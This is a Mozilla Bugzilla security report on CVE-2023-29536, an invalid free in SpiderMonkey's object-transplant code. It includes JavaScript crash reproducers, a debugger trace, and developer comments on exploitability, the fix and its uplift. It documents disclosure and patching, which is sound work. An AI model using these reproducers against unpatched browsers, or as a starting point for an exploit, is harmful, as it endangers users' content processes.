# MOZ_DIAGNOSTIC_ASSERT in mozjemalloc from background thread free()

Bug URL: https://bugzilla.mozilla.org/show_bug.cgi?id=1821959
CVE: CVE-2023-29536
Component: JavaScript Engine
Bounty: (unknown)
Date: 2023-03-13T05:17:42Z
Keywords: csectype-uaf, reporter-external, sec-high

When run this following javascript code, gecko fail at mozjemalloc
```
const v1 = this.transplantableObject();
const v2 = v1.object;
for (let v3 = 0; v3 < 100; v3++) {
    const v5 = String.fromCharCode();
    const v8 = [v5];
    Reflect.apply(([v5,v5,v5,v5,v5]).unshift, v2, v8);
}
v1.transplant(newGlobal());
```
DEBUG
```

/*
Assertion failure: diff == regind * size, at /home/s/gecko-dev/memory/build/mozjemalloc.cpp:2515  

In file: /home/s/gecko-dev/memory/build/mozjemalloc.cpp 
   2510 
   2511   MOZ_ASSERT(diff <=
   2512              (static_cast<unsigned>(bin->mRunSizePages) << gPageSize2Pow));
   2513   regind = diff / bin->mSizeDivisor;
   2514 
 ► 2515   MOZ_DIAGNOSTIC_ASSERT(diff == regind * size);
   2516   MOZ_DIAGNOSTIC_ASSERT(regind < bin->mRunNumRegions);
   2517 
   2518   elm = regind >> (LOG2(sizeof(int)) + 3);
   2519   if (elm < run->mRegionsMinElement) {
   2520     run->mRegionsMinElement = elm;
──────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff6bff9b0 —▸ 0x7ffff7900d80 ◂— 0x947d3d24
01:0008│     0x7ffff6bff9b8 —▸ 0x7ffff6e07001 ◂— 0x880000001f384adf
02:0010│     0x7ffff6bff9c0 —▸ 0x7ffff7900d80 ◂— 0x947d3d24
03:0018│     0x7ffff6bff9c8 —▸ 0x7ffff6e00000 —▸ 0x7ffff7900d80 ◂— 0x947d3d24
04:0020│     0x7ffff6bff9d0 —▸ 0x7ffff7900da0 ◂— 0x2
05:0028│     0x7ffff6bff9d8 —▸ 0x7ffff6e0a858 ◂— 0xe5e5e5e5e5e5e5e5
06:0030│ rbp 0x7ffff6bff9e0 —▸ 0x7ffff6bffa20 —▸ 0x7ffff6bffb50 —▸ 0x7ffff6bffba0 —▸ 0x7ffff6bffc20 ◂— ...
07:0038│     0x7ffff6bff9e8 —▸ 0x555556dab580 (arena_dalloc(void*, unsigned long, arena_t*)+176) ◂— jmp 0x555556dab5c6
────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x555556db066d arena_t::DallocSmall(arena_chunk_t*, void*, arena_chunk_map_t*)+1021
   f 1   0x555556db066d arena_t::DallocSmall(arena_chunk_t*, void*, arena_chunk_map_t*)+1021
   f 2   0x555556dab580 arena_dalloc(void*, unsigned long, arena_t*)+176
   f 3   0x55555777669d js::gc::GCRuntime::freeFromBackgroundThread(js::AutoLockHelperThreadState&)+781
   f 4   0x55555777669d js::gc::GCRuntime::freeFromBackgroundThread(js::AutoLockHelperThreadState&)+781
   f 5   0x55555777669d js::gc::GCRuntime::freeFromBackgroundThread(js::AutoLockHelperThreadState&)+781
   f 6   0x5555577043e6 js::GCParallelTask::runTask(JS::GCContext*, js::AutoLockHelperThreadState&)+118
   f 7   0x5555577046ac js::GCParallelTask::runHelperThreadTask(js::AutoLockHelperThreadState&)+172
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> bt
#0  arena_run_reg_dalloc (run=<optimized out>, bin=<optimized out>, ptr=<optimized out>, size=<optimized out>) at /home/s/gecko-dev/memory/build/mozjemalloc.cpp:2515
#1  arena_t::DallocSmall (this=this@entry=0x7ffff7900d80, aChunk=aChunk@entry=0x7ffff6e00000, aPtr=aPtr@entry=0x7ffff6e0a858, aMapElm=<optimized out>) at /home/s/gecko-dev/memory/build/mozjemalloc.cpp:3652
#2  0x0000555556dab580 in arena_dalloc (aPtr=0x7ffff6e0a858, aOffset=<optimized out>, aArena=<optimized out>) at /home/s/gecko-dev/memory/build/mozjemalloc.cpp:3743
#3  0x000055555777669d in js_free (p=0x7ffff7c4ea60 <_IO_stdfile_2_lock>) at /home/s/gecko-dev/obj-fuzzbuild/dist/include/js/Utility.h:414
#4  JS::GCContext::freeUntracked (p=0x7ffff7c4ea60 <_IO_stdfile_2_lock>, this=<optimized out>) at /home/s/gecko-dev/js/src/gc/GCContext.h:117
#5  js::gc::GCRuntime::freeFromBackgroundThread (this=0x7ffff6e23728, lock=...) at /home/s/gecko-dev/js/src/gc/Sweeping.cpp:477
#6  0x00005555577043e6 in js::GCParallelTask::runTask (this=this@entry=0x7ffff6e250b8, gcx=gcx@entry=0x7ffff6bffbb0, lock=...) at /home/s/gecko-dev/js/src/gc/GCParallelTask.cpp:209
#7  0x00005555577046ac in js::GCParallelTask::runHelperThreadTask (this=0x7ffff6e250b8, lock=...) at /home/s/gecko-dev/js/src/gc/GCParallelTask.cpp:193
#8  0x0000555556fe8967 in js::GlobalHelperThreadState::runTaskLocked (this=this@entry=0x7ffff6e0f000, task=0x7ffff7c4ea60 <_IO_stdfile_2_lock>, locked=...) at /home/s/gecko-dev/js/src/vm/HelperThreads.cpp:2767
#9  0x0000555556fe8710 in js::GlobalHelperThreadState::runOneTask (this=0x7ffff6e0f000, lock=...) at /home/s/gecko-dev/js/src/vm/HelperThreads.cpp:2736
#10 0x0000555556ffa9a2 in js::HelperThread::threadLoop (this=this@entry=0x7ffff6e1c0a0, pool=pool@entry=0x7ffff6e17200) at /home/s/gecko-dev/js/src/vm/InternalThreadPool.cpp:282
#11 0x0000555556ffa75c in js::HelperThread::ThreadMain (pool=0x7ffff6e17200, helper=0x7ffff6e1c0a0) at /home/s/gecko-dev/js/src/vm/InternalThreadPool.cpp:225
#12 0x000055555700cee8 in js::detail::ThreadTrampoline<void (&)(js::InternalThreadPool*, js::HelperThread*), js::InternalThreadPool*&, js::HelperThread*>::callMain<0ul, 1ul> (this=0x7ffff6e195f0) at /home/s/gecko-dev/js/s
rc/threading/Thread.h:220
#13 js::detail::ThreadTrampoline<void (&)(js::InternalThreadPool*, js::HelperThread*), js::InternalThreadPool*&, js::HelperThread*>::Start (aPack=0x7ffff6e195f0) at /home/s/gecko-dev/js/src/threading/Thread.h:209
#14 0x00007ffff7ac7b43 in start_thread (arg=<optimized out>) at ./nptl/pthread_create.c:442
#15 0x00007ffff7b59a00 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81

*/
```

---

**Comment 1 — dveditz@mozilla.com — 2023-03-15T21:25:33Z**

Whether this is a security bug or not depends on whether the transplantableObject() mechanism in the jsshell is the source of the problem, or merely exposing a problem that could be accessible from web JavaScript.

---

**Comment 2 — tcampbell@mozilla.com — 2023-03-21T12:12:24Z**

This is a nice find. I'm investigating what the consequences in full browser are, but it _looks_ like a real bug.

Simplified test case:
```js
const v1 = this.transplantableObject();
const v2 = v1.object;
Array.prototype.push.call(v2, 0);
Array.prototype.push.call(v2, 0);
Array.prototype.shift.call(v2);
v1.transplant(newGlobal());
```

There is definitely a defect in the swap code with us forgetting to use `unshiftedElementsHeader` to get the base of the allocation. https://searchfox.org/mozilla-central/rev/f078cd02746b29652c134b144f0629d47e378166/js/src/vm/JSObject.cpp#1048,1102

---

**Comment 3 — tcampbell@mozilla.com — 2023-03-21T15:30:04Z**

I can reproduce this in web content. We end up calling free on an address in the middle of user-controlled data, so this probably is exploitable in content process. This is likely an old bug and certainly reproduces in ESR-102.

---

**Comment 4 — tcampbell@mozilla.com — 2023-03-21T16:02:09Z**

Created attachment 9324220
Bug 1821959 - Use unshiftedElementsHeader when transplanting objects. r?jandem!

---

**Comment 5 — release-mgmt-account-bot@mozilla.tld — 2023-03-22T12:13:51Z**

The severity field for this bug is set to S3. However, the bug is flagged with the `sec-high` keyword.
:tcampbell, could you consider increasing the severity of this security bug?

For more information, please visit [auto_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#severity_high_security.py).

---

**Comment 6 — release-mgmt-account-bot@mozilla.tld — 2023-03-22T12:15:01Z**

The bug is marked as tracked for firefox112 (beta) and tracked for firefox113 (nightly). However, the bug still has low severity.

:sdetar, could you please increase the severity for this tracked bug? If you disagree with the tracking decision, please talk with the release managers.


For more information, please visit [auto_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#tracked_attention.py).

---

**Comment 7 — tcampbell@mozilla.com — 2023-03-24T17:56:34Z**

Created attachment 9324915
Bug 1821959 - Add test case. r?jandem!

---

**Comment 8 — tcampbell@mozilla.com — 2023-03-24T18:06:44Z**

Comment on attachment 9324220
Bug 1821959 - Use unshiftedElementsHeader when transplanting objects. r?jandem!

### Security Approval Request
* **How easily could an exploit be constructed based on the patch?**: A careful reader would notice we are freeing a pointer inside a buffer instead of the pointer to start of buffer which highlights the bug. Building the scenario to hit this in the browser is not obvious, but with some care could be constructed by a non-jit-expert. Finally, exploiting an allocator with a bad free is a tricky but not uncommon attack vector. The content sandbox still protects us though.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: all
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: This rebases onto ESR, Release, Beta channels cleanly.
* **How likely is this patch to cause regressions; how much testing does it need?**: Regression risk is low. We were using what is clearly the wrong API and have replaced it with the correct API that is already heavily used in similar cases.
* **Is Android affected?**: Yes

---

**Comment 9 — tom@mozilla.com — 2023-03-28T15:05:01Z**

Comment on attachment 9324220
Bug 1821959 - Use unshiftedElementsHeader when transplanting objects. r?jandem!

Approved to request uplift and land.

---

**Comment 10 — ryanvm@gmail.com — 2023-03-29T03:17:39Z**

https://hg.mozilla.org/mozilla-central/rev/56605de82f79

---

**Comment 11 — release-mgmt-account-bot@mozilla.tld — 2023-03-29T12:01:31Z**

The patch landed in nightly and beta is affected.
:tcampbell, is this bug important enough to require an uplift?
- If yes, please nominate the patch for beta approval.
- If no, please set `status-firefox112` to `wontfix`.

For more information, please visit [auto_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#uplift_beta.py).

---

**Comment 12 — tcampbell@mozilla.com — 2023-03-29T17:16:49Z**

Manually confirmed that crash/bug is resolved on today's Nightly. Moz-regression also correctly identifies my patch as the point it is fixed. I don't see any new crashes involving these function signatures either.

---

**Comment 13 — tcampbell@mozilla.com — 2023-03-29T17:17:56Z**

Created attachment 9325791
Bug 1821959 - Use unshiftedElementsHeader when transplanting objects. r?jandem!



Original Revision: https://phabricator.services.mozilla.com/D173171

---

**Comment 14 — phab-bot@bmo.tld — 2023-03-29T17:22:35Z**

# Uplift Approval Request
- **String changes made/needed**: No
- **Is Android affected?**: yes
- **Code covered by automated testing**: yes
- **Explanation of risk level**: Specific code branches are rarely hit. Replace incorrect helper function call with the correct one that is already used in well tested code.
- **Risk associated with taking this patch**: low
- **User impact if declined**: sec-high bug that can crash and maybe control a content process
- **Fix verified in Nightly**: yes
- **Steps to reproduce for manual QE testing**: n/a
- **Needs manual QE test**: no

---

**Comment 15 — tcampbell@mozilla.com — 2023-03-29T17:23:04Z**

Created attachment 9325794
Bug 1821959 - Use unshiftedElementsHeader when transplanting objects. r?jandem!



Original Revision: https://phabricator.services.mozilla.com/D173171

---

**Comment 16 — phab-bot@bmo.tld — 2023-03-29T17:24:25Z**

# Uplift Approval Request
- **Needs manual QE test**: no
- **Steps to reproduce for manual QE testing**: n/a
- **Fix verified in Nightly**: yes
- **User impact if declined**: sec-high bug may crash or control a content process
- **Risk associated with taking this patch**: low
- **Explanation of risk level**:  Specific code branches are rarely hit. Replace incorrect helper function call with the correct one that is already used in well tested code.
- **Code covered by automated testing**: yes
- **Is Android affected?**: yes
- **String changes made/needed**: no

---

**Comment 17 — dsmith@mozilla.com — 2023-03-29T18:34:43Z**

https://hg.mozilla.org/releases/mozilla-beta/rev/fd0964962cce

---

**Comment 18 — ryanvm@gmail.com — 2023-03-29T18:45:42Z**

https://hg.mozilla.org/releases/mozilla-esr102/rev/653028530bed

---

**Comment 19 — release-mgmt-account-bot@mozilla.tld — 2023-03-30T12:15:09Z**

A patch has been attached on this bug, which was already closed. Filing a separate bug will ensure better tracking. If this was not by mistake and further action is needed, please alert the appropriate party. (Or: if the patch doesn't change behavior -- e.g. landing a test case, or fixing a typo -- then feel free to disregard this message)

---

**Comment 20 — tom@mozilla.com — 2023-04-05T20:04:12Z**

Created attachment 9327219
advisory.txt

---

**Comment 21 — tcampbell@mozilla.com — 2023-04-10T15:20:10Z**

Minor correction to the advisory. This doesn't really have anything to do with the JITs. Could just title it "Invalid free from JavaScript code" or something to that effect.

---

**Comment 22 — release-mgmt-account-bot@mozilla.tld — 2023-05-23T12:00:38Z**

a month ago, Tom Ritter [:tjr] placed a reminder on the bug using the whiteboard tag `[reminder-test 2023-05-23]` .

tcampbell, please refer to the original comment to better understand the reason for the reminder.

---

**Comment 23 — tcampbell@mozilla.com — 2023-05-23T19:07:52Z**

Testcase pushed. Thanks, BugBot.

---

**Comment 24 — aryx.bugmail@gmx-topmail.de — 2023-05-24T10:38:21Z**

Add test case. r=jandem
https://hg.mozilla.org/integration/autoland/rev/f003daf55d7ec46ebbc4914860c177f7c5523e07
https://hg.mozilla.org/mozilla-central/rev/f003daf55d7e
